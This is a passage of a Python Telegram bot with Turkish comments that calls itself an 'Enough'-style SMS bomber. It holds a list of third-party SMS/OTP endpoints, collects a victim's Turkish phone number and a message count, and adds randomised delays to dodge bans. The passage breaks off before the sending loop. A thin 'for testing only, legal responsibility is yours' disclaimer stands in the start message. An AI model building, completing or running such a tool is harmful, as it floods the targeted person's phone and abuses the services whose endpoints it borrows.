# main.py - Hatasız deploy için optimize edilmiş versiyon (21 Mart 2026)

import asyncio
import logging
import os
import random
from datetime import datetime

import httpx
from dotenv import load_dotenv
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
)

# Logging - Railway logları temiz görünsün
logging.basicConfig(
    format='%(asctime)s | %(levelname)s | %(message)s',
    level=logging.INFO,
    datefmt='%H:%M:%S'
)
logger = logging.getLogger(__name__)

load_dotenv()
BOT_TOKEN = os.getenv("BOT_TOKEN")
if not BOT_TOKEN:
    raise ValueError("BOT_TOKEN ortam değişkeni eksik! Railway Variables'a ekle.")

# Enough-Reborn fork'larından + 2026 başı kısmen yaşayan Türkiye servisleri
SERVICES = [
    {"name": "kandilli-mirror", "url": "https://api.kandilli.info/sms", "method": "GET", "params": {"phone": "{phone}", "amount": "{count}"}},
    {"name": "sms24-vercel",    "url": "https://sms24api.vercel.app/send", "method": "GET", "params": {"to": "{phone}", "count": "{count}"}},
    {"name": "temp-number-org", "url": "https://temp-number.org/api/sms", "method": "GET", "params": {"number": "{phone}", "amount": "{count}"}},
    {"name": "otp-xn--sms",     "url": "https://otp.xn--sms-0ra.net/send", "method": "GET", "params": {"phone": "{phone}"}},
]

MAX_COUNT = 60              # çok yüksek girilirse ban riski artar
REQUEST_TIMEOUT = 12.0
DELAY_BETWEEN = (1.2, 4.0)

def md_escape(s: str) -> str:
    """MarkdownV2'de patlamaması için rezerv karakterleri kaçır"""
    for c in r'_*[]()~`>#+-=|{}.!':
        s = s.replace(c, f'\\{c}')
    return s

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = md_escape(
        "💣 Enough tarzı SMS Bomber\n\n"
        "Komut: /sms\n"
        "Sonra numarayı yaz → sonra adedi yaz\n"
        "⚠ Test amaçlıdır. Yasal sorumluluk sende."
    )
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN_V2)


async def sms(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = md_escape(
        "📞 Numarayı yaz\n"
        "Örnek: 5391234567 veya 905391234567\n"
        "\\(0 ile başlasan da otomatik +90 olur\\)"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN_V2)
    context.user_data["state"] = "phone"


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = context.user_data.get("state")
    if not state:
        return

    text = update.message.text.strip()

    if state == "phone":
        phone = "".join(c for c in text if c.isdigit())
        if phone.startswith("0"):
            phone = "90" + phone[1:]
        elif len(phone) == 10:
            phone = "90" + phone

        if len(phone) != 12 or not phone.startswith("90"):
            await update.message.reply_text(md_escape("❌ Numara hatalı. Tekrar yaz."), parse_mode=ParseMode.MARKDOWN_V2)
            return

        context.user_data["phone"] = phone
        context.user_data["state"] = "count"

        msg = md_escape(
            f"✅ Numara alındı: `{phone}`\n\n"
            f"🔥 Kaç adet göndereyim? (max {MAX_COUNT})"
        )
        await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN_V2)

    elif state == "count":
        try:
            count = int(text)
            if count < 1 or count > MAX_COUNT:
                await update.message.reply_text(md_escape(f"1-{MAX_COUNT} arası sayı gir."), parse_mode=ParseMode.MARKDOWN_V2)
                return
        except ValueError:
            await update.message.reply_text(md_escape("Sayı gir lütfen."), parse_mode=ParseMode.MARKDOWN_V2)
            return

        context.user_data["count"] = count
        context.user_data["state"] = None

        phone = context.user_data["phone"]
        msg = md_escape(
            f"🚀 Başlatılıyor...\n"
            f"Numara → `{phone}`\n"
            f"Adet   → `{count}`\n"
            f
